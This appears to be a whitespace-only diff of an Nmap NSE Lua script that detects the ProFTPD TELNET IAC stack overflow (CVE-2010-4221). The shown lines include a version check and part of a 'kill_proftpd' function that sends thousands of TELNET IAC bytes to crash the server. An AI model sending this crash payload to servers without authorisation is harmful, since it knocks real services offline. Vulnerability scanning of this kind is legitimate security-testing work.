@@ -25,7 +25,7 @@ Reference:
 -- @output
 -- PORT   STATE SERVICE
 -- 21/tcp open  ftp
--- | ftp-vuln-cve2010-4221: 
+-- | ftp-vuln-cve2010-4221:
 -- |   VULNERABLE:
 -- |   ProFTPD server TELNET IAC stack overflow
 -- |     State: VULNERABLE
@@ -76,7 +76,7 @@ end
 -- Returns true if the provided version is vulnerable
 local function is_version_vulnerable(version)
   local vers = stdnse.strsplit("%.", version)
-  
+
   if #vers > 0 and vers[3] then
     local relnum = string.sub(vers[3], 1, 1)
     local extra = string.sub(vers[3], 2)
@@ -105,7 +105,7 @@ end
 local function kill_proftpd(socket)
   local killed = false
   local TELNET_KILL = '\000'..'\255' -- TELNET_DUMMY..TELNET_IAC
-  
+
   stdnse.print_debug(2, "%s: sending evil TELNET_IAC commands.",
                         SCRIPT_NAME)
   local st, ret = socket:send(string.rep(TELNET_KILL, 4069)..
